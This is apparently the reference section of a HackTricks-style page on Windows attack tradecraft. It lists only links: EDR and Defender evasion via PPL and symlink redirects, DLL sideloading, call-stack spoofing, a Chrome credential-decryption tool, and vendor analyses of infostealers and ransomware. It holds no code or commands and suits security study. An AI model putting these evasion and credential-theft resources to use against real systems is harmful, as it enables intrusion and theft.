- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
